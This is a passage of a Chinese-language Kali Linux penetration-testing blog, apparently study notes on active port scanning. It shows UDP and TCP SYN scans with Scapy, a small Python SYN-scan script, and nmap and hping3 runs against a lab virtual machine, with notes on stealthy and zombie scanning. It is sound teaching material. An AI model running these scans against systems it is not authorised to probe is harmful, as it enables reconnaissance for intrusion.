10.10.10.129/80 (http response) ]-</span><br><span class="line">|</span><br><span class="line">| server   = 10.10.10.129/80</span><br><span class="line">| app      = Apache 2.x</span><br><span class="line">| lang     = none</span><br><span class="line">| params   = none</span><br><span class="line">| raw_sig  = 1:Date,Server,Connection=[Keep-Alive],Keep-Alive=[<span class="built_in">timeout</span>=15, max=100],?ETag,?Vary:Content-Type,Accept-Ranges:Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1</span><br><span class="line">|</span><br><span class="line">`----</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211204165000215-868086210.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>OS 识别</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集之端口扫描</title>
    <url>/2021/11/29/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h2 id="端口扫描">1. 端口扫描</h2>
<p><strong>端口对应网络服务及应用端程序</strong></p>
<p><strong>服务端程序的漏洞通过端口攻入</strong></p>
<p><strong>发现开放的端口</strong></p>
<p><strong>更具体的攻击面</strong></p>
<p><strong>注意</strong> ，该阶段是针对存在的IP扫描的</p>
<h2 id="udp端口扫描">2. UDP端口扫描</h2>
<ul>
<li><strong>假设ICMP port-unreachable响应代表端口关闭</strong></li>
<li>目标系统不响应ICMP port-unreachable时，可能产生误判</li>
<li><strong>完整的UPD应用层请求</strong></li>
<li>准确性高</li>
<li>耗时巨大</li>
</ul>
<h3 id="scapy-udp-scan">1、Scapy UDP Scan</h3>
<p><strong>端口关闭: ICMP port-unreachable</strong></p>
<p><strong>端口开放:没有回包</strong></p>
<p>了解每一种基于UDP的应用层包结构很有帮助（即可针对性扫描，但难度太大）</p>
<p>与三层相同的技术</p>
<p>误判</p>
<h4 id="scapy">（1）Scapy</h4>
<p><strong>命令基本格式</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sr1 (IP(dst=<span class="string">&quot;1.1.1.1&quot;</span>)/UDP(dport= 53),<span class="built_in">timeout</span>=1 ,verbose=1)</span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># scapy</span></span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br><span class="line">                                      </span><br><span class="line">                     aSPY//YASa       </span><br><span class="line">             apyyyyCY//////////YCa       |</span><br><span class="line">            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line"> ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4</span><br><span class="line"> AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">         SPPPP///a          pP///AC//Y   |</span><br><span class="line">              A//A            cyP////C   | Have fun!</span><br><span class="line">              p///Ac            sC///a   |</span><br><span class="line">              P////YCpc           A//A   | We are <span class="keyword">in</span> France, we say Skappee.</span><br><span class="line">       scccccp///pSP///p          p//Y   | OK? Merci.</span><br><span class="line">      sY/////////y  caa           S//P   |             -- Sebastien Chabal</span><br><span class="line">       cayCyayP//Ya              pY/Ya   |</span><br><span class="line">        sY/PsY////YCc          aC//Yp </span><br><span class="line">         sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                  spCPY//////YPSps    </span><br><span class="line">                       ccaacs         </span><br><span class="line">                                       using IPython 7.22.0</span><br><span class="line">&gt; &gt;&gt; i=IP()</span><br><span class="line">&gt;&gt;&gt; u=UDP()</span><br><span class="line">&gt;&gt;&gt; iu=(i/u)</span><br><span class="line">&gt;&gt;&gt; iu.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= udp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 127.0.0.1</span><br><span class="line">  dst= 127.0.0.1</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ UDP ]### </span></span><br><span class="line">     sport= domain</span><br><span class="line">     dport= domain　　　　　　　　<span class="comment">#默认53</span></span><br><span class="line">     len= None</span><br><span class="line">     chksum= None</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; iu[IP].dst=<span class="string">&quot;10.10.10.129&quot;</span>　　　<span class="comment">#目标机</span></span><br><span class="line">&gt;&gt;&gt; iu[UDP].dport=53　　　　　　　　 <span class="comment">#指定想要测试的端口（个人目标机53未开放）</span></span><br><span class="line">&gt;&gt;&gt; iu.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= udp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 10.10.10.135</span><br><span class="line">  dst= 10.10.10.129</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ UDP ]### </span></span><br><span class="line">     sport= domain</span><br><span class="line">     dport= domain</span><br><span class="line">     len= None</span><br><span class="line">     chksum= None</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; a=sr1(iu)　　　　　　　　　　<span class="comment">#发包，注意一般是要加上timeout的，因为我的目标机上的53未开放，所以偷个懒没加</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">.*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt; a.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0xc0</span><br><span class="line">  len= 56</span><br><span class="line">  <span class="built_in">id</span>= 3785</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= icmp</span><br><span class="line">  chksum= 0x4221</span><br><span class="line">  src= 10.10.10.129</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ ICMP ]### </span></span><br><span class="line">     <span class="built_in">type</span>= dest-unreach</span><br><span class="line">     code= port-unreachable　　　　　　<span class="comment">#端口未开</span></span><br><span class="line">     chksum= 0x2632</span><br><span class="line">     reserved= 0</span><br><span class="line">     length= 0</span><br><span class="line">     nexthopmtu= 0</span><br><span class="line"><span class="comment">###[ IP in ICMP ]### </span></span><br><span class="line">        version= 4</span><br><span class="line">        ihl= 5</span><br><span class="line">        tos= 0x0</span><br><span class="line">        len= 28</span><br><span class="line">        <span class="built_in">id</span>= 1</span><br><span class="line">        flags= </span><br><span class="line">        frag= 0</span><br><span class="line">        ttl= 64</span><br><span class="line">        proto= udp</span><br><span class="line">        chksum= 0x51b5</span><br><span class="line">        src= 10.10.10.135</span><br><span class="line">        dst= 10.10.10.129</span><br><span class="line">        \options\</span><br><span class="line"><span class="comment">###[ UDP in ICMP ]### </span></span><br><span class="line">           sport= domain</span><br><span class="line">           dport= domain</span><br><span class="line">           len= 8</span><br><span class="line">           chksum= 0xd658</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; iu[UDP].dport=137　　　　　　　　<span class="comment">#测试开放开放端口137</span></span><br><span class="line">&gt;&gt;&gt; a2=sr1(iu,<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received 1 packets, got 0 answers, remaining 1 packets　　　　　　<span class="comment">#注意这种情况，仅能得出目标端口&quot; 可能 &quot;是开放的</span></span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p><strong>抓包截图</strong></p>
<ul>
<li><strong>53端口测试</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129093405478-1428649620.png" /></p>
<ul>
<li><strong>137端口测试</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129093211720-328362449.png" /></p>
<h4 id="scapy脚本">（2）Scapy脚本</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./udp_ scan.py 1.1.1.1 1 100</span><br></pre></td></tr></table></figure>
<p>脚本待补……</p>
<h3 id="nmap">2、Nmap</h3>
<p><strong>命令基本格式</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU 1.1.1.1 -p 起始端口号  终止端口号</span><br><span class="line">nmap -iL iplist.txt -sU -p 1-200</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>默认的1000个参数</strong></li>
<li><strong>ICMP host-unreachable</strong></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nmap -sU 10.10.10.129 -p 53</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 20:41 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE     SERVICE</span><br><span class="line">53/udp open|filtered domain</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.41 seconds  </span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># nmap -sU  10.10.10.129  -p 0-200</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 20:40 EST</span><br><span class="line">Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 90.93% <span class="keyword">done</span>; ETC: 20:43 (0:00:19 remaining)</span><br><span class="line">Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 91.43% <span class="keyword">done</span>; ETC: 20:43 (0:00:18 remaining)</span><br><span class="line">Stats: 0:03:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.67% <span class="keyword">done</span>; ETC: 20:43 (0:00:01 remaining)</span><br><span class="line">Stats: 0:03:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:43 (0:00:00 remaining)</span><br><span class="line">Stats: 0:03:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:43 (0:00:00 remaining)</span><br><span class="line">Stats: 0:03:33 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:43 (0:00:00 remaining)</span><br><span class="line">Stats: 0:03:34 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:43 (0:00:00 remaining)</span><br><span class="line">Stats: 0:03:43 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:44 (0:00:00 remaining)</span><br><span class="line">Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:44 (0:00:00 remaining)</span><br><span class="line">Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:44 (0:00:00 remaining)</span><br><span class="line">Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 20:44 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 199 closed ports</span><br><span class="line">PORT    STATE         SERVICE</span><br><span class="line">137/udp open|filtered netbios-ns</span><br><span class="line">138/udp open|filtered netbios-dgm</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 228.15 seconds</span><br></pre></td></tr></table></figure>
<h2 id="tcp端口扫描">3. TCP端口扫描</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128173457501-1862031704.png" /></p>
<ul>
<li><strong>基于连接的协议</strong></li>
<li><strong>三次握手</strong></li>
<li><strong>隐蔽扫描（SYN）</strong></li>
<li>不建立完整连接（也就是说，src发完SYN，收到dst响应的SYN+ACK后不再发ACK）</li>
<li>应用日志不记录扫描行为----隐蔽</li>
<li><strong>僵尸扫描</strong></li>
<li><strong>图解扫描原理</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128223607475-2382280.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128223616054-1411968643.jpg" /></p>
<ul>
<li>极度隐蔽</li>
<li>实施条件苛刻</li>
<li>可伪造源地址</li>
<li>但难度越来越大，因为边界路由器基本都加入了防地址伪造的策略</li>
<li>僵尸机选择</li>
<li>闲置的系统</li>
<li>系统使用递增的IPID（随机的无法实现）</li>
<li><strong>全连接扫描</strong></li>
<li>不隐蔽，容易触发网络层的入侵检测系统，自己的 IP 也会被记录。</li>
<li><strong>所有的TCP扫描方式</strong></li>
<li><strong>都是基于三次握手的变化</strong></li>
<li><strong>来判断目标端口状态</strong></li>
</ul>
<h3 id="隐蔽端口扫描">1、隐蔽端口扫描</h3>
<h4 id="scapy-1">（1）Scapy</h4>
<p><strong>示例（端口开放的情况）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># scapy</span></span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br><span class="line">                                          </span><br><span class="line">                         aSPY//YASa       </span><br><span class="line">                 apyyyyCY//////////YCa       |</span><br><span class="line">                sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line">     ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4</span><br><span class="line">     AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">             pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">             SPPPP///a          pP///AC//Y   |</span><br><span class="line">                  A//A            cyP////C   | Have fun!</span><br><span class="line">                  p///Ac            sC///a   |</span><br><span class="line">                  P////YCpc           A//A   | To craft a packet, you have to be a</span><br><span class="line">           scccccp///pSP///p          p//Y   | packet, and learn how to swim <span class="keyword">in</span></span><br><span class="line">          sY/////////y  caa           S//P   | the wires and <span class="keyword">in</span> the waves.</span><br><span class="line">           cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme</span><br><span class="line">            sY/PsY////YCc          aC//Yp    |</span><br><span class="line">             sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                      spCPY//////YPSps    </span><br><span class="line">                           ccaacs         </span><br><span class="line">                                           using IPython 7.22.0</span><br><span class="line">&gt; &gt;&gt; i=IP()</span><br><span class="line">&gt;&gt;&gt; t=TCP()</span><br><span class="line">&gt;&gt;&gt; it=(i/t)</span><br><span class="line">&gt;&gt;&gt; it.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 127.0.0.1</span><br><span class="line">  dst= 127.0.0.1</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags=S　　　　　　　　<span class="comment">#发的SYN包</span></span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line">    </span><br><span class="line">&gt; &gt;&gt; it[IP].dst=<span class="string">&quot;10.10.10.129&quot;</span></span><br><span class="line">&gt;&gt;&gt; a=sr1(it)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">.*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt; &gt;&gt;a.display()　　　　　　　　<span class="comment">#查看回包数据</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= 44</span><br><span class="line">  <span class="built_in">id</span>= 0</span><br><span class="line">  flags= DF</span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= 0x11b1</span><br><span class="line">  src= 10.10.10.129</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= http</span><br><span class="line">     dport= ftp_data</span><br><span class="line">     <span class="built_in">seq</span>= 793215637</span><br><span class="line">     ack= 1</span><br><span class="line">     dataofs= 6</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags=SA　　　　　　<span class="comment">#目标机回了个SYN+ACK数据包 = &gt;端口是开着的</span></span><br><span class="line">     window= 5840</span><br><span class="line">     chksum= 0xa5e9</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= [(<span class="string">&#x27;MSS&#x27;</span>, 1460)]</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load= <span class="string">&#x27;\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包分析</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129100226205-1902340186.png" /></p>
<p><strong>备注：SYN包是 scapy
发的，对于操作系统而言它并不知道，为此突然收到SYN+ACK包时，内核认为该包是个非法包，会直接回个RST包中断连接</strong></p>
<p><strong>示例（端口关闭的情况）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; &gt;&gt; it[TCP].dport=88</span><br><span class="line">&gt;&gt;&gt; a=sr1(it)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">.*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt; a.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= 40</span><br><span class="line">  <span class="built_in">id</span>= 0</span><br><span class="line">  flags= DF</span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= 0x11b5</span><br><span class="line">  src= 10.10.10.129</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= kerberos</span><br><span class="line">     dport= ftp_data</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 1</span><br><span class="line">     dataofs= 5</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags=RA　　　　　　　　　　<span class="comment">#RST+ACK= &gt;端口是关闭的</span></span><br><span class="line">     window= 0</span><br><span class="line">     chksum= 0x8648</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load= <span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129101459625-35890127.png" /></p>
<h4 id="scapy脚本-1">（2）Scapy脚本</h4>
<ul>
<li>** tcp_scan.py**</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage - ./scapy.py  [Target-IP]  [First Port]  [Last Port]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Example - ./scapy.py  10.10.10.1  1  100&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Example will TCP SYN scan ports 1 through 100 on 10.10.10.1&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">start=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">end=<span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">    a=sr1(IP(dst=ip)/TCP(dport=port),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(a[TCP].flags==<span class="number">18</span>):　　　　　　<span class="comment">#为什么=18，自己抓个回包，查看下flags（转为10进制）字段就明白了</span></span><br><span class="line">            <span class="built_in">print</span>(port)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/Tools]</span><br><span class="line">└─<span class="comment"># python3 ./syn_scapy.py 10.10.10.129 1 100</span></span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">80</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129103230135-2082979127.png" /></p>
<p><strong>注意，有时会被防火墙屏蔽掉</strong></p>
<h4 id="nmap-1">（3）nmap</h4>
<p>** 示例：**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment">#nmap -sS  10.10.10.129  -p 21,22,25,80,143 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 21:35 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">21/tcp  open   ftp</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">25/tcp  closed smtp</span><br><span class="line">80/tcp  open   http</span><br><span class="line">143/tcp open   imap</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.41 seconds</span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment">#nmap -sS  10.10.10.129  -p 1-100   </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 21:37 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">Not shown: 97 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.27 seconds</span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment">#nmap -sS  10.10.10.129  -p 22</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 21:40 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.0033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.36 seconds</span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment">#nmap -sS -iL ./iplist.txt -p 80,21,22,25 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 21:43 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">21/tcp open   ftp</span><br><span class="line">22/tcp open   ssh</span><br><span class="line">25/tcp closed smtp</span><br><span class="line">80/tcp open   http</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 2 IP addresses (1 host up) scanned <span class="keyword">in</span> 14.57 seconds</span><br></pre></td></tr></table></figure>
<h4 id="hping3">（4）hping3</h4>
<p><strong>注意：hping3不做逆地址解析</strong></p>
<p><strong>示例（基本用法）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># hping3 10.10.10.129 --scan 80 -S</span></span><br><span class="line">Scanning 10.10.10.129 (10.10.10.129), port 80</span><br><span class="line">1 ports to scan, use -V to see all the replies</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">|port| serv name |  flags  |ttl| <span class="built_in">id</span>  | win | len |</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">   80 http       : .S..A...  64     0  5840    46</span><br><span class="line">All replies received. Done.</span><br><span class="line">Not responding ports: </span><br><span class="line">                                                                                               </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># hping3 10.10.10.129 --scan 80,21,22,25,443 -S</span></span><br><span class="line">Scanning 10.10.10.129 (10.10.10.129), port 80,21,22,25,443</span><br><span class="line">5 ports to scan, use -V to see all the replies</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">|port| serv name |  flags  |ttl| <span class="built_in">id</span>  | win | len |</span><br><span class="line">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="line">   21 ftp        : .S..A...  64     0  5840    46</span><br><span class="line">   22 ssh        : .S..A...  64     0  5840    46</span><br><span class="line">   80 http       : .S..A...  64     0  5840    46</span><br><span class="line">All replies received. Done.</span><br><span class="line">Not responding ports: </span><br><span class="line">   </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># hping3 10.10.10.129 --scan 100-200 -S</span></span><br><span class="line">Scanning 10.10.10.129 (10.10.10.129), port 100-200</span><br><span class="line">101 ports 